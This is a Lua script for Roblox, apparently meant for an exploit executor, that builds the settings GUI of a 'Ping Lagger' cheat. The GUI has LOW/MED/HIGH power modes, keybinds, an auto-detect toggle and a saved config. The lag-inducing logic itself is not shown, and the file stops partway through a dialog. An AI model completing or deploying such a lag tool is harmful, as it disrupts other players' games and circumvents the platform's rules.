--[[
    ʟᴜᴄᴋ PING LAGGER
    Tema Verde
    - LOW / MED / HIGH
    - Keybind teclado + mando
    - Auto-save (LuckPing.json)
    - Auto Brainrot Detection
]]

local _MVPPingLaggerScreen = nil
function openMVPPingLagger()
    if _MVPPingLaggerScreen and _MVPPingLaggerScreen.Parent then
        local existingMain = _MVPPingLaggerScreen:FindFirstChild("MainFrame")
        if existingMain then existingMain.Visible = true end
        return _MVPPingLaggerScreen
    end
    -- Galaxy Ping Lagger integrado en MVP
    -- PC + Controller keybind | Customizable | Auto-save | Auto Brainrot Detection | Modos LOW/MED/HIGH

    local UserInputService = game:GetService("UserInputService")
    local TweenService     = game:GetService("TweenService")
    local HttpService      = game:GetService("HttpService")
    local Players          = game:GetService("Players")
    local RunService       = game:GetService("RunService")

    local plr              = Players.LocalPlayer
    local plrGui           = plr:WaitForChild("PlayerGui")

    -- ══════════════════════════════════════════════════════════════════════
    -- CONFIG & SAVE
    -- ══════════════════════════════════════════════════════════════════════
    local CONFIG_FILE = "LuckPing.json"

    local DEFAULT_CFG = {
        power         = 100000,
        interval      = 0.125,
        keybindKb     = "F",
        keybindGp     = "ButtonR2",
        autoBrainrot  = true,
        mode          = "LOW",
    }

    local MODES = {
        LOW  = { power = 100000, interval = 0.125  },
        MED  = { power = 100000, interval = 0.12   },
        HIGH = { power = 100000, interval = 0.0125 },
    }

    local cfg = {
        power         = DEFAULT_CFG.power,
        interval      = DEFAULT_CFG.interval,
        keybindKb     = DEFAULT_CFG.keybindKb,
        keybindGp     = DEFAULT_CFG.keybindGp,
        autoBrainrot  = DEFAULT_CFG.autoBrainrot,
        mode          = DEFAULT_CFG.mode,
    }

    local function resolveKb(name)
        if not name or name == "" or name == "None" then return nil end
        local ok, val = pcall(function() return Enum.KeyCode[name] end)
        return (ok and val) or nil
    end

    local function saveConfig()
        local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
        if ok and encoded and writefile then
            pcall(writefile, CONFIG_FILE, encoded)
        end
    end

    local function loadConfig()
        if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
        local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
        if not ok or type(data) ~= "table" then return end

        cfg.power         = tonumber(data.power) or DEFAULT_CFG.power
        cfg.interval      = tonumber(data.interval) or DEFAULT_CFG.interval
        cfg.keybindKb     = type(data.keybindKb) == "string" and data.keybindKb or DEFAULT_CFG.keybindKb
        cfg.keybindGp     = type(data.keybindGp) == "string" and data.keybindGp or DEFAULT_CFG.keybindGp
        cfg.autoBrainrot  = type(data.autoBrainrot) == "boolean" and data.autoBrainrot or DEFAULT_CFG.autoBrainrot
        cfg.mode          = type(data.mode) == "string" and MODES[data.mode] and data.mode or DEFAULT_CFG.mode

        local m = MODES[cfg.mode]
        if m then
            cfg.power    = m.power
            cfg.interval = m.interval
        end
    end

    loadConfig()

    local active            = false
    local listeningFor      = nil
    local remote            = nil
    local brainrotMode      = false
    local lastBrainrotState = false
    local manualOverride    = false

    -- ══════════════════════════════════════════════════════════════════════
    -- COLOURS (transparente, igual que el MVP)
    -- ══════════════════════════════════════════════════════════════════════
    local C = {
        -- Green palette: all green
        bg      = Color3.fromRGB(8, 24, 12),
        panel   = Color3.fromRGB(10, 28, 16),
        card    = Color3.fromRGB(12, 32, 18),
        gold1   = Color3.fromRGB(20, 200, 70),   -- green
        gold2   = Color3.fromRGB(25, 230, 70),   -- bright green
        gold3   = Color3.fromRGB(140, 255, 170), -- light green
        glow    = Color3.fromRGB(60, 255, 110),   -- green glow
        white   = Color3.fromRGB(245, 255, 248),
        dim     = Color3.fromRGB(180, 200, 185),
        green   = Color3.fromRGB(40, 200, 90),
        yellow  = Color3.fromRGB(180, 255, 120),
        red     = Color3.fromRGB(40, 220, 90),
        waiting = Color3.fromRGB(180, 255, 140),
        inputBg = Color3.fromRGB(20, 35, 25),
        discord = Color3.fromRGB(120, 220, 140),
    }
    local T = {bg = 0.08, panel = 0.06, card = 0.10, header = 0.02, inputBg = 0.08}

    local MODE_TEXT_COLORS = {
        LOW  = Color3.fromRGB(60, 220, 100),
        MED  = Color3.fromRGB(120, 255, 140),
        HIGH = Color3.fromRGB(25, 230, 70),
    }

    -- ══════════════════════════════════════════════════════════════════════
    -- DESTROY OLD GUI
    -- ══════════════════════════════════════════════════════════════════════
    for _, kid in pairs(plrGui:GetChildren()) do
        if kid.Name == "LuckPingGui" then kid:Destroy() end
    end

    local screen = Instance.new("ScreenGui")
    screen.Name         = "LuckPingGui"
    screen.ResetOnSpawn = false
    screen.DisplayOrder = 15
    screen.Parent       = plrGui

    -- ══════════════════════════════════════════════════════════════════════
    -- HELPERS
    -- ══════════════════════════════════════════════════════════════════════
    local function applyGradient(parent, c1, c2, rotation)
        local g = Instance.new("UIGradient", parent)
        g.Color    = ColorSequence.new({ ColorSequenceKeypoint.new(0,c1), ColorSequenceKeypoint.new(1,c2) })
        g.Rotation = rotation or 135
        return g
    end

    local function tw(obj, props, t)
        TweenService:Create(obj,
            TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            props):Play()
    end

    local function makeDraggable(frame)
        local dragging, dragStart, startPos
        frame.InputBegan:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1
            or i.UserInputType == Enum.UserInputType.Touch then
                dragging  = true
                dragStart = i.Position
                startPos  = frame.Position
                i.Changed:Connect(function()
                    if i.UserInputState == Enum.UserInputState.End then dragging = false end
                end)
            end
        end)
        frame.InputChanged:Connect(function(i)
            if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement
                          or i.UserInputType == Enum.UserInputType.Touch) then
                local d = i.Position - dragStart
                frame.Position = UDim2.new(
                    startPos.X.Scale, startPos.X.Offset + d.X,
                    startPos.Y.Scale, startPos.Y.Offset + d.Y)
            end
        end)
    end

    local function isGamepad(kc)
        local n = kc.Name
        return n:sub(1,6)=="Button" or n:sub(1,10)=="Thumbstick"
            or n:sub(1,4)=="DPad" or n=="ButtonSelect" or n=="ButtonStart"
    end

    local BLACKLISTED = {
        [Enum.KeyCode.Escape]      = true,
        [Enum.KeyCode.LeftControl] = true,
        [Enum.KeyCode.Unknown]     = true,
    }


    -- MAIN WINDOW
    -- ══════════════════════════════════════════════════════════════════════
    local function addSunsetScene(frame)
        local image = Instance.new("ImageLabel", frame)
        image.Name = "LuckScene"
        image.Size = UDim2.fromScale(1, 1)
        image.BackgroundTransparency = 1
        image.Image = "rbxassetid://87771074340660"
        image.ImageTransparency = 0.15
        image.ScaleType = Enum.ScaleType.Crop
        image.Visible = true
        image.ZIndex = frame.ZIndex
        Instance.new("UICorner", image).CornerRadius = UDim.new(0, 12)
    end
    local MAIN_W, MAIN_H = 210, 130

    local mainFrame = Instance.new("Frame")
    mainFrame.Name             = "MainFrame"
    mainFrame.Size             = UDim2.new(0, MAIN_W, 0, MAIN_H)
    mainFrame.Position         = UDim2.new(0.5, -MAIN_W/2, 0.5, -MAIN_H/2)
    mainFrame.BackgroundColor3 = C.bg
    mainFrame.BackgroundTransparency = T.bg
    mainFrame.BorderSizePixel  = 0
    mainFrame.Active           = true
    mainFrame.ClipsDescendants = false
    mainFrame.Parent           = screen
    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)
    applyGradient(mainFrame, C.bg, Color3.fromRGB(12, 40, 22), 160)
    addSunsetScene(mainFrame)

    local mainStroke = Instance.new("UIStroke", mainFrame)
    mainStroke.Color        = C.gold1
    mainStroke.Thickness    = 1.5
    mainStroke.Transparency = 0.35


    makeDraggable(mainFrame)

    -- Header
    local header = Instance.new("Frame", mainFrame)
    header.Size             = UDim2.new(1,0,0,32)
    header.BackgroundColor3 = C.gold1
    header.BackgroundTransparency = T.header
    header.BorderSizePixel  = 0
    header.ZIndex           = 2
    Instance.new("UICorner", header).CornerRadius = UDim.new(0,12)
    applyGradient(header, C.gold1, C.gold2, 135)

    local headerFill = Instance.new("Frame", mainFrame)
    headerFill.Size             = UDim2.new(1,0,0,8)
    headerFill.Position         = UDim2.new(0,0,0,24)
    headerFill.BackgroundColor3 = C.gold1
    headerFill.BackgroundTransparency = T.header
    headerFill.BorderSizePixel  = 0
    headerFill.ZIndex           = 2
    applyGradient(headerFill, C.gold1, C.gold2, 135)

    local titleLbl = Instance.new("TextLabel", header)
    titleLbl.Size               = UDim2.new(1,-90,1,0)
    titleLbl.Position           = UDim2.new(0,10,0,0)
    titleLbl.BackgroundTransparency = 1
    titleLbl.Text               = "ʟᴜᴄᴋ"
    titleLbl.TextColor3         = C.white
    titleLbl.Font               = Enum.Font.GothamBlack
    titleLbl.TextSize           = 11
    titleLbl.TextXAlignment     = Enum.TextXAlignment.Left
    titleLbl.ZIndex             = 3

    -- Status pill
    local statusPill = Instance.new("Frame", header)
    statusPill.Size             = UDim2.new(0,40,0,16)
    statusPill.Position         = UDim2.new(1,-82,0.5,-8)
    statusPill.BackgroundColor3 = Color3.fromRGB(70, 20, 25)
    statusPill.BackgroundTransparency = 0.15
    statusPill.BorderSizePixel  = 0
    statusPill.ZIndex           = 3
    Instance.new("UICorner", statusPill).CornerRadius = UDim.new(1,0)

    local statusLbl = Instance.new("TextLabel", statusPill)
    statusLbl.Size              = UDim2.new(1,0,1,0)
    statusLbl.BackgroundTransparency = 1
    statusLbl.Text              = "OFF"
    statusLbl.TextColor3        = C.red
    statusLbl.Font              = Enum.Font.GothamBlack
    statusLbl.TextSize          = 8
    statusLbl.ZIndex            = 4

    -- Settings emoji button
    local settingsEmojiBtn = Instance.new("TextButton", header)
    settingsEmojiBtn.Size             = UDim2.new(0,24,0,24)
    settingsEmojiBtn.Position         = UDim2.new(1,-28,0.5,-12)
    settingsEmojiBtn.BackgroundColor3 = Color3.fromRGB(55, 18, 22)
    settingsEmojiBtn.BackgroundTransparency = 0.15
    settingsEmojiBtn.BorderSizePixel  = 0
    settingsEmojiBtn.AutoButtonColor  = false
    settingsEmojiBtn.Text             = "⚙️"
    settingsEmojiBtn.TextColor3       = C.white
    settingsEmojiBtn.Font             = Enum.Font.GothamBlack
    settingsEmojiBtn.TextSize         = 14
    settingsEmojiBtn.ZIndex           = 23
    Instance.new("UICorner", settingsEmojiBtn).CornerRadius = UDim.new(0,6)
    settingsEmojiBtn.MouseEnter:Connect(function()
        tw(settingsEmojiBtn,{BackgroundColor3=C.gold1},0.1)
    end)
    settingsEmojiBtn.MouseLeave:Connect(function()
        tw(settingsEmojiBtn,{BackgroundColor3=Color3.fromRGB(55, 18, 22)},0.1)
    end)

    -- Activate button
    local activateBtn = Instance.new("TextButton", mainFrame)
    activateBtn.Size             = UDim2.new(1,-16,0,28)
    activateBtn.Position         = UDim2.new(0,8,0,38)
    activateBtn.BackgroundColor3 = C.card
    activateBtn.BackgroundTransparency = T.card
    activateBtn.BorderSizePixel  = 0
    activateBtn.AutoButtonColor  = false
    activateBtn.Text             = ""
    activateBtn.ZIndex           = 3
    Instance.new("UICorner", activateBtn).CornerRadius = UDim.new(0,8)
    local activateGrad = applyGradient(activateBtn, C.gold1, C.gold2, 135)

    local activateStroke = Instance.new("UIStroke", activateBtn)
    activateStroke.Color        = C.gold3
    activateStroke.Thickness    = 1.2
    activateStroke.Transparency = 0.4

    local activateLbl = Instance.new("TextLabel", activateBtn)
    activateLbl.Size            = UDim2.new(1,0,1,0)
    activateLbl.BackgroundTransparency = 1
    activateLbl.Text            = "ACTIVATE"
    activateLbl.TextColor3      = C.white
    activateLbl.Font            = Enum.Font.GothamBlack
    activateLbl.TextSize        = 11
    activateLbl.ZIndex          = 5

    -- ══════════════════════════════════════════════════════════════════════
    -- MODE (LOW / MED / HIGH)
    -- ══════════════════════════════════════════════════════════════════════
    local modeRow = Instance.new("Frame", mainFrame)
    modeRow.Size             = UDim2.new(1,-16,0,22)
    modeRow.Position         = UDim2.new(0,8,0,72)
    modeRow.BackgroundColor3 = C.card
    modeRow.BackgroundTransparency = T.card
    modeRow.BorderSizePixel  = 0
    modeRow.ZIndex           = 3
    Instance.new("UICorner", modeRow).CornerRadius = UDim.new(0,7)
    local modeRowStroke = Instance.new("UIStroke", modeRow)
    modeRowStroke.Color = C.glow
    modeRowStroke.Thickness = 1
    modeRowStroke.Transparency = 0.5

    local modeButtons = {}
    local modeList = {"LOW", "MED", "HIGH"}
    local modeBtnW = (MAIN_W - 16 - 8) / 3

    local function refreshModeButtons()
        for name, btn in pairs(modeButtons) do
            if cfg.mode == name then
                btn.TextColor3 = MODE_TEXT_COLORS[name]
            else
                btn.TextColor3 = C.dim
            end
        end
    end

    for i, name in ipairs(modeList) do
        local btn = Instance.new("TextButton", modeRow)
        btn.Size             = UDim2.new(0, modeBtnW - 4, 0, 18)
        btn.Position         = UDim2.new(0, 4 + (i-1) * (modeBtnW - 4) + (i-1) * 2, 0.5, -9)
        btn.BackgroundColor3 = Color3.fromRGB(30, 55, 35)
        btn.BackgroundTransparency = 0.4
        btn.BorderSizePixel  = 0
        btn.AutoButtonColor  = false
        btn.Text             = name
        btn.TextColor3       = C.dim
        btn.Font             = Enum.Font.GothamBold
        btn.TextSize         = 9
        btn.ZIndex           = 4
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0,5)

        btn.MouseButton1Click:Connect(function()
            cfg.mode = name
            local m = MODES[name]
            if m then
                cfg.power    = m.power
                cfg.interval = m.interval
            end
            refreshModeButtons()
            saveConfig()
        end)

        modeButtons[name] = btn
    end

    refreshModeButtons()

    -- ══════════════════════════════════════════════════════════════════════
    -- DISCORD LINK
    -- ══════════════════════════════════════════════════════════════════════
    local discordLbl = Instance.new("TextLabel", mainFrame)
    discordLbl.Size             = UDim2.new(1,-16,0,18)
    discordLbl.Position         = UDim2.new(0,8,0,100)
    discordLbl.BackgroundTransparency = 1
    discordLbl.Text             = "✦ ʟᴜᴄᴋ ✦"
    discordLbl.TextColor3       = C.discord
    discordLbl.Font             = Enum.Font.GothamBold
    discordLbl.TextSize         = 9
    discordLbl.ZIndex           = 3

    -- ══════════════════════════════════════════════════════════════════════
    -- SETTINGS PANEL
    -- ══════════════════════════════════════════════════════════════════════
    local SET_W, SET_H = 220, 340

    local settingsFrame = Instance.new("Frame")
    settingsFrame.Name             = "SettingsPanel"
    settingsFrame.Size             = UDim2.new(0,SET_W,0,SET_H)
    settingsFrame.Position         = UDim2.new(0.5,-SET_W/2,0.5,60)
    settingsFrame.BackgroundColor3 = C.panel
    settingsFrame.BackgroundTransparency = T.panel
    settingsFrame.BorderSizePixel  = 0
    settingsFrame.Active           = true
    settingsFrame.ClipsDescendants = true
    settingsFrame.Visible          = false
    settingsFrame.ZIndex           = 20
    settingsFrame.Parent           = screen
    Instance.new("UICorner", settingsFrame).CornerRadius = UDim.new(0,12)
    applyGradient(settingsFrame, C.panel, Color3.fromRGB(12, 40, 22), 160)
    addSunsetScene(settingsFrame)

    local setStroke = Instance.new("UIStroke", settingsFrame)
    setStroke.Color        = C.glow
    setStroke.Thickness    = 1.4
    setStroke.Transparency = 0.3


    makeDraggable(settingsFrame)

    local setHeader = Instance.new("Frame", settingsFrame)
    setHeader.Size             = UDim2.new(1,0,0,32)
    setHeader.BackgroundColor3 = C.glow
    setHeader.BackgroundTransparency = T.header
    setHeader.BorderSizePixel  = 0
    setHeader.ZIndex           = 21
    Instance.new("UICorner", setHeader).CornerRadius = UDim.new(0,12)
    applyGradient(setHeader, C.glow, C.gold1, 135)

    local setHeaderFill = Instance.new("Frame", settingsFrame)
    setHeaderFill.Size             = UDim2.new(1,0,0,8)
    setHeaderFill.Position         = UDim2.new(0,0,0,24)
    setHeaderFill.BackgroundColor3 = C.glow
    setHeaderFill.BackgroundTransparency = T.header
    setHeaderFill.BorderSizePixel  = 0
    setHeaderFill.ZIndex           = 21
    applyGradient(setHeaderFill, C.glow, C.gold1, 135)

    local setTitle = Instance.new("TextLabel", setHeader)
    setTitle.Size               = UDim2.new(1,-80,1,0)
    setTitle.Position           = UDim2.new(0,10,0,0)
    setTitle.BackgroundTransparency = 1
    setTitle.Text               = "Settings"
    setTitle.TextColor3         = C.white
    setTitle.Font               = Enum.Font.GothamBlack
    setTitle.TextSize           = 11
    setTitle.TextXAlignment     = Enum.TextXAlignment.Left
    setTitle.ZIndex             = 22

    local setCloseBtn = Instance.new("TextButton", setHeader)
    setCloseBtn.Size             = UDim2.new(0,24,0,24)
    setCloseBtn.Position         = UDim2.new(1,-28,0.5,-12)
    setCloseBtn.BackgroundColor3 = Color3.fromRGB(55, 18, 22)
    setCloseBtn.BackgroundTransparency = 0.15
    setCloseBtn.BorderSizePixel  = 0
    setCloseBtn.AutoButtonColor  = false
    setCloseBtn.Text             = "X"
    setCloseBtn.TextColor3       = C.white
    setCloseBtn.Font             = Enum.Font.GothamBlack
    setCloseBtn.TextSize         = 11
    setCloseBtn.ZIndex           = 23
    Instance.new("UICorner", setCloseBtn).CornerRadius = UDim.new(0,6)
    setCloseBtn.MouseEnter:Connect(function() tw(setCloseBtn,{BackgroundColor3=C.red},0.1) end)
    setCloseBtn.MouseLeave:Connect(function() tw(setCloseBtn,{BackgroundColor3=Color3.fromRGB(55, 18, 22)},0.1) end)

    local function mkInputRow(yPos, labelText, getValue, onConfirm)
        local row = Instance.new("Frame", settingsFrame)
        row.Size             = UDim2.new(1,-16,0,34)
        row.Position         = UDim2.new(0,8,0,yPos)
        row.BackgroundColor3 = C.card
        row.BackgroundTransparency = T.card
        row.BorderSizePixel  = 0
        row.ZIndex           = 21
        Instance.new("UICorner", row).CornerRadius = UDim.new(0,8)
        local rs = Instance.new("UIStroke",row); rs.Color=C.glow; rs.Thickness=1; rs.Transparency=0.6

        local lbl = Instance.new("TextLabel", row)
        lbl.Size               = UDim2.new(0.45,0,1,0)
        lbl.Position           = UDim2.new(0,10,0,0)
        lbl.BackgroundTransparency = 1
        lbl.Text               = labelText
        lbl.TextColor3         = C.white
        lbl.Font               = Enum.Font.GothamBold
        lbl.TextSize           = 10
        lbl.TextXAlignment     = Enum.TextXAlignment.Left
        lbl.ZIndex             = 22

        local box = Instance.new("TextBox", row)
        box.Size               = UDim2.new(0,64,0,24)
        box.Position           = UDim2.new(1,-72,0.5,-12)
        box.BackgroundColor3   = C.inputBg
        box.BackgroundTransparency = T.inputBg
        box.BorderSizePixel    = 0
        box.Text               = tostring(getValue())
        box.TextColor3         = C.gold3
        box.Font               = Enum.Font.GothamBold
        box.TextSize           = 11
        box.ClearTextOnFocus   = false
        box.ZIndex             = 23
        Instance.new("UICorner", box).CornerRadius = UDim.new(0,6)

        local bs = Instance.new("UIStroke",box); bs.Color=C.glow; bs.Thickness=1; bs.Transparency=0.5

        box.Focused:Connect(function()   tw(bs,{Color=C.gold2,Transparency=0},0.12) end)
        box.FocusLost:Connect(function()
            tw(bs,{Color=C.glow,Transparency=0.5},0.12)
            local n = tonumber(box.Text)
            if n then
                onConfirm(n)
                box.Text = tostring(getValue())
                saveConfig()
            else
                box.Text = tostring(getValue())
            end
        end)

        return box
    end

    local kbBindBtn, gpBindBtn

    local function updateKbLabels()
        if kbBindBtn then
            if listeningFor == "kb" then
                kbBindBtn.Text       = "Press a key..."
                kbBindBtn.TextColor3 = C.waiting
            else
                kbBindBtn.Text       = cfg.keybindKb ~= "" and cfg.keybindKb or "None"
                kbBindBtn.TextColor3 = C.gold3
            end
        end
        if gpBindBtn then
            if listeningFor == "gp" then
                gpBindBtn.Text       = "Press a button..."
                gpBindBtn.TextColor3 = C.waiting
            else
                gpBindBtn.Text       = cfg.keybindGp ~= "" and cfg.keybindGp or "None"
                gpBindBtn.TextColor3 = C.gold3
            end
        end
    end

    local function mkKeybindRow(yPos, labelText, which)
        local row = Instance.new("Frame", settingsFrame)
        row.Size             = UDim2.new(1,-16,0,34)
        row.Position         = UDim2.new(0,8,0,yPos)
        row.BackgroundColor3 = C.card
        row.BackgroundTransparency = T.card
        row.BorderSizePixel  = 0
        row.ZIndex           = 21
        Instance.new("UICorner", row).CornerRadius = UDim.new(0,8)
        local rs = Instance.new("UIStroke",row); rs.Color=C.glow; rs.Thickness=1; rs.Transparency=0.6

        local lbl = Instance.new("TextLabel", row)
        lbl.Size               = UDim2.new(0.4,0,1,0)
        lbl.Position           = UDim2.new(0,10,0,0)
        lbl.BackgroundTransparency = 1
        lbl.Text               = labelText
        lbl.TextColor3         = C.white
        lbl.Font               = Enum.Font.GothamBold
        lbl.TextSize           = 10
        lbl.TextXAlignment     = Enum.TextXAlignment.Left
        lbl.ZIndex             = 22

        local bindBtn = Instance.new("TextButton", row)
        bindBtn.Size             = UDim2.new(0,72,0,24)
        bindBtn.Position         = UDim2.new(1,-88,0.5,-12)
        bindBtn.BackgroundColor3 = C.inputBg
        bindBtn.BackgroundTransparency = T.inputBg
        bindBtn.BorderSizePixel  = 0
        bindBtn.AutoButtonColor  = false
        bindBtn.Font             = Enum.Font.GothamBold
        bindBtn.TextSize         = 9
        bindBtn.TextColor3       = C.gold3
        bindBtn.ZIndex           = 23
        bindBtn.Text             = which == "kb" and cfg.keybindKb or cfg.keybindGp
        Instance.new("UICorner", bindBtn).CornerRadius = UDim.new(0,6)

        local bStr = Instance.new("UIStroke",bindBtn); bStr.Color=C.glow; bStr.Thickness=1; bStr.Transparency=0.5
        bindBtn.MouseEnter:Connect(function() tw(bStr,{Color=C.gold2,Transparency=0},0.1) end)
        bindBtn.MouseLeave:Connect(function() tw(bStr,{Color=C.glow,Transparency=0.5},0.1) end)

        bindBtn.MouseButton1Click:Connect(function()
            listeningFor = (listeningFor == which) and nil or which
            updateKbLabels()
        end)

        local clearBtn = Instance.new("TextButton", row)
        clearBtn.Size             = UDim2.new(0,24,0,24)
        clearBtn.Position         = UDim2.new(1,-28,0.5,-12)
        clearBtn.BackgroundColor3 = Color3.fromRGB(30,15,15)
        clearBtn.BackgroundTransparency = T.inputBg
        clearBtn.BorderSizePixel  = 0
        clearBtn.AutoButtonColor  = false
        clearBtn.Text             = "X"
        clearBtn.TextColor3       = C.red
        clearBtn.Font             = Enum.Font.GothamBlack
        clearBtn.TextSize         = 10
        clearBtn.ZIndex           = 23
        Instance.new("UICorner", clearBtn).CornerRadius = UDim.new(0,6)
        local cStr = Instance.new("UIStroke",clearBtn); cStr.Color=C.red; cStr.Thickness=1; cStr.Transparency=0.5
        clearBtn.MouseEnter:Connect(function() tw(cStr,{Transparency=0},0.1) end)
        clearBtn.MouseLeave:Connect(function() tw(cStr,{Transparency=0.5},0.1) end)

        clearBtn.MouseButton1Click:Connect(function()
            if listeningFor == which then listeningFor = nil end
            if which == "kb" then cfg.keybindKb = "None" else cfg.keybindGp = "None" end
            updateKbLabels()
            saveConfig()
        end)

        if which == "kb" then kbBindBtn = bindBtn end
        if which == "gp" then gpBindBtn = bindBtn end

        return bindBtn
    end

    local autoBrainrotBtn

    local function createBrainrotRow(yPos)
        local row = Instance.new("Frame", settingsFrame)
        row.Size             = UDim2.new(1,-16,0,34)
        row.Position         = UDim2.new(0,8,0,yPos)
        row.BackgroundColor3 = C.card
        row.BackgroundTransparency = T.card
        row.BorderSizePixel  = 0
        row.ZIndex           = 21
        Instance.new("UICorner", row).CornerRadius = UDim.new(0,8)
        local rs = Instance.new("UIStroke",row); rs.Color=C.glow; rs.Thickness=1; rs.Transparency=0.6

        local lbl = Instance.new("TextLabel", row)
        lbl.Size               = UDim2.new(0.7,0,1,0)
        lbl.Position           = UDim2.new(0,10,0,0)
        lbl.BackgroundTransparency = 1
        lbl.Text               = "Auto Brainrot"
        lbl.TextColor3         = C.white
        lbl.Font               = Enum.Font.GothamBold
        lbl.TextSize           = 10
        lbl.TextXAlignment     = Enum.TextXAlignment.Left
        lbl.ZIndex             = 22

        local toggleBtn = Instance.new("TextButton", row)
        toggleBtn.Size             = UDim2.new(0,50,0,24)
        toggleBtn.Position         = UDim2.new(1,-58,0.5,-12)
        toggleBtn.BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(60,20,20)
        toggleBtn.BorderSizePixel  = 0
        toggleBtn.AutoButtonColor  = false
        toggleBtn.Text             = cfg.autoBrainrot and "ON" or "OFF"
        toggleBtn.TextColor3       = C.white
        toggleBtn.Font             = Enum.Font.GothamBlack
        toggleBtn.TextSize         = 9
        toggleBtn.ZIndex           = 23
        Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(1,0)

        local tStr = Instance.new("UIStroke", toggleBtn)
        tStr.Color = C.glow; tStr.Thickness = 1; tStr.Transparency = 0.5

        toggleBtn.MouseButton1Click:Connect(function()
            cfg.autoBrainrot = not cfg.autoBrainrot
            toggleBtn.Text = cfg.autoBrainrot and "ON" or "OFF"
            tw(toggleBtn, {BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(60,20,20)}, 0.15)
            saveConfig()
        end)

        autoBrainrotBtn = toggleBtn
        return toggleBtn
    end

    local Y = 36
    local GAP = 6

    local powerBox = mkInputRow(Y, "Power", function() return cfg.power end, function(v)
        cfg.power = math.max(1, v)
    end)
    Y = Y + 34 + GAP

    local intervalBox = mkInputRow(Y, "Delay (secs)", function() return cfg.interval end, function(v)
        cfg.interval = math.max(0.001, v)
    end)
    Y = Y + 34 + GAP

    createBrainrotRow(Y)
    Y = Y + 34 + GAP

    local div = Instance.new("Frame", settingsFrame)
    div.Size             = UDim2.new(1,-16,0,1)
    div.Position         = UDim2.new(0,8,0,Y)
    div.BackgroundColor3 = C.glow
    div.BorderSizePixel  = 0
    div.BackgroundTransparency = 0.5
    div.ZIndex           = 21
    Y = Y + 8

    local kbSectLbl = Instance.new("TextLabel", settingsFrame)
    kbSectLbl.Size               = UDim2.new(1,-16,0,16)
    kbSectLbl.Position           = UDim2.new(0,8,0,Y)
    kbSectLbl.BackgroundTransparency = 1
    kbSectLbl.Text               = "KEYBINDS"
    kbSectLbl.TextColor3         = C.dim
    kbSectLbl.Font               = Enum.Font.GothamBold
    kbSectLbl.TextSize           = 8
    kbSectLbl.TextXAlignment     = Enum.TextXAlignment.Left
    kbSectLbl.ZIndex             = 21
    Y = Y + 16

    mkKeybindRow(Y, "Keyboard",   "kb"); Y = Y + 34 + GAP
    mkKeybindRow(Y, "Controller", "gp"); Y = Y + 34 + GAP

    local resetBtn = Instance.new("TextButton", settingsFrame)
    resetBtn.Size             = UDim2.new(1,-16,0,26)
    resetBtn.Position         = UDim2.new(0,8,0,Y)
    resetBtn.BackgroundColor3 = C.glow
    resetBtn.BorderSizePixel  = 0
    resetBtn.AutoButtonColor  = false
    resetBtn.Text             = "Reset Defaults"
    resetBtn.TextColor3       = C.white
    resetBtn.Font             = Enum.Font.GothamBold
    resetBtn.TextSize         = 10
    resetBtn.ZIndex           = 21
    Instance.new("UICorner", resetBtn).CornerRadius = UDim.new(0,7)
    applyGradient(resetBtn, C.glow, C.gold1, 135)
    resetBtn.MouseEnter:Connect(function() tw(resetBtn,{BackgroundColor3=C.gold1},0.1) end)
    resetBtn.MouseLeave:Connect(function() tw(resetBtn,{BackgroundColor3=C.glow},0.1) end)

    -- ══════════════════════════════════════════════════════════════════════
    -- RESET CONFIRM DIALOG
    -- ══════════════════════════════════════════════════════════════════════
    local confirmBackdrop = Instance.new("Frame")
    confirmBackdrop.Name                   = "ConfirmBackdrop"
    confirmBackdrop.Size                   = UDim2.new(1,0,1,0)
    confirmBackdrop.BackgroundColor3       = Color3.fromRGB(0,0,0)
    confirmBackdrop.BackgroundTransparency = 0.45
    confirmBackdrop.BorderSizePixel        = 0
    confirmBackdrop.Visible                = false
    confirmBackdrop.ZIndex                 = 50
    confirmBackdrop.Parent                 = screen

    local confirmBox = Instance.new("Frame", confirmBackdrop)
    confirmBox.Size             = UDim2.new(0,210,0,120)
    confirmBox.Position         = UDim2.new(0.5,-105,0.5,-60)
    confirmBox.BackgroundColor3 = C.panel
    confirmBox.BackgroundTransparency = T.panel
    confirmBox.BorderSizePixel  = 0
    confirmBox.ZIndex           = 51
    Instance.new("UICorner", confirmBox).CornerRadius = UDim.new(0,10)
    applyGradient(confirmBox, C.panel, Color3.fromRGB(40, 14, 16), 160)

    local cStroke = Instance.new("UIStroke", confirmBox)
    cStroke.Color = C.gold1; cStroke.Thickness = 1.3; cStroke.Transparency = 0.3

    local confirmLbl = Instance.new("TextLabel", confirmBox)
    confirmLbl.Size               = UDim2.new(1,-16,0,58)
    confirmLbl.Position           = UDim2.new(0,8,0,8)
    confirmLbl.BackgroundTransparency = 1
    confirmLbl.Text               = "Reset all settings to defaults?"
    confirmLbl.TextWrapped        = true
    confirmLbl.TextColor3         = C.white
    confirmLbl.Font               = Enum.Font.GothamBold
    confirmLbl.TextSize           = 11
    confirmLbl.ZIndex             = 52

    local confirmYes = Instance.new("TextButton", confirmBox)
    confirmYes.Size             = UDim2.new(0,92,0,30)
    confirmYes.Position         = UDim2.new(0,8,1,-38)
    confirmYes.BackgroundColor3 = C.glow
    confirmYes.BorderSizePixel  = 0
    confirmYes.AutoButtonColor  = false
    confirmYes.Text             = "Confirm"
    confirmYes.TextColor3       = C.white
    confirmYes.Font             = Enum.Font.GothamBlack
    confirmYes.TextSize         = 11
    confirmYes.ZIndex           = 52
    Instance.new("UICorner", confirmYes).CornerRadius = UDim.new(0,7)
    applyGradient(confirmYes, C.glow, C.gold1, 135)

    local confirmNo = Instance.new("TextButton", confirmBox)
    confirmNo.Size             = UDim2.new(0,92,0,30)
    confirmNo.Position         = UDim2.new(1,-100,1,-38)
    confirmNo.BackgroundColor3 = C.card
    confirmNo.BorderSizePixel  = 0
    confirmNo.AutoButtonColor  = false
    confirmNo.Text             = "Cancel"
    confirmNo.TextColor3       = C.dim
    confirmNo.Font             = Enum.Font.GothamBold
    confirmNo.TextSize         = 11
    confirmNo.ZIndex           = 52
